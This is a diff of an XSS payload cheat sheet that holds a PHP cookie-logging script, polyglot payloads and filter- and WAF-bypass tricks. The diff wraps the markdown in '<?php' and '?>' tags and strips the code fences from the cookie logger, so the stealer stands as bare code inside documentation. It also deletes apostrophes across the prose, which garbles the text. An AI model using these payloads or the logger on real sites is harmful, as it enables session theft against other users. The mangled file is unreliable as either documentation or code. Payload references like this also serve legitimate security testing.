@@ -1,6 +1,8 @@
+<?php
 # Cross Site Scripting
 
-Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.
+> Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. 
+> XSS enables attackers to inject client-side scripts into web pages viewed by other users.
 
 ## Summary
 
@@ -64,8 +66,6 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
 - [CSP Bypass](#csp-bypass)
 - [Common WAF Bypass](#common-waf-bypass)
 
-
-
 ## Exploit code or POC
 
 ### Data grabber for XSS
@@ -81,15 +81,10 @@ Obtains the administrator cookie or sensitive access token, the following payloa
 
 Write the collected data into a file.
 
-```php
-<?php
 $cookie = $_GET['c'];
 $fp = fopen('cookies.txt', 'a+');
 fwrite($fp, 'Cookie:' .$cookie."\r\n");
 fclose($fp);
-?>
-```
-
 ### CORS
 
 ```html
@@ -142,11 +137,11 @@ This payload opens the debugger in the developper console rather than triggering
 
 Modern applications with content hosting can use [sandbox domains][sandbox-domains]
 
-> to safely host various types of user-generated content. Many of these sandboxes are specifically meant to isolate user-uploaded HTML, JavaScript, or Flash applets and make sure that they can't access any user data.
+> to safely host various types of user-generated content. Many of these sandboxes are specifically meant to isolate user-uploaded HTML, JavaScript, or Flash applets and make sure that they cant access any user data.
 
 [sandbox-domains]:https://security.googleblog.com/2012/08/content-hosting-for-modern-web.html
 
-For this reason, it's better to use `alert(document.domain)` or `alert(window.origin)` rather than `alert(1)` as default XSS payload in order to know in which scope the XSS is actually executing.
+For this reason, its better to use `alert(document.domain)` or `alert(window.origin)` rather than `alert(1)` as default XSS payload in order to know in which scope the XSS is actually executing.
 
 Better payload replacing `<script>alert(1)</script>`:
 
@@ -154,9 +149,7 @@ Better payload replacing `<script>alert(1)</script>`:
 <script>alert(document.domain.concat("\n").concat(window.origin))</script>
 ```
 
-While `alert()` is nice for reflected XSS it can quickly become a burden for stored XSS because it requires to close the popup for each execution, so `console.log()` can be used instead to display a message in the console of the developper console (doesn't require any interaction).
-
-Example:
+While `alert()` is nice for reflected XSS it can quickly become a burden for stored XSS because it requires to close the popup for each execution, so `console.log()` can be used instead to display a message in the console of the developper console (doesnt require any interaction).
 
 ```html
 <script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
@@ -578,7 +571,7 @@ Polyglot XSS - [@s0md3v](https://twitter.com/s0md3v/status/966175714302144514)
 <svg%0Ao%00nload=%09((pro\u006dpt))()//
 ```
 
-Polyglot XSS - from [@filedescriptor's Polyglot Challenge](http://polyglot.innerht.ml)
+Polyglot XSS - from [@filedescriptors Polyglot Challenge](http://polyglot.innerht.ml)
 
 ```javascript
 # by crlf
@@ -768,7 +761,7 @@ content['alert'](6)
 
 From [@theMiddle](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/) - Using global variables
 
-The Object.keys() method returns an array of a given object's own property names, in the same order as we get with a normal loop. That's means that we can access any JavaScript function by using its **index number instead the function name**.
+The Object.keys() method returns an array of a given objects own property names, in the same order as we get with a normal loop. Thats means that we can access any JavaScript function by using its **index number instead the function name**.
 
 ```javascript
 c=0; for(i in self) { if(i == "alert") { console.log(c); } c++; }
@@ -856,7 +849,7 @@ XSSObject.proxy(window, 'alert', 'window.alert', false);
 
 ### Bypass ">" using nothing
 
-You don't need to close your tags.
+You dont need to close your tags.
 
 ```javascript
 <svg onload=alert(1)//
@@ -1248,3 +1241,4 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 - [mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, Jörg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang](https://cure53.de/fp170.pdf)
 - [Self Closing Script](https://twitter.com/PortSwiggerRes/status/1257962800418349056)
 - [Bypass < with ＜](https://hackerone.com/reports/639684)
+?>
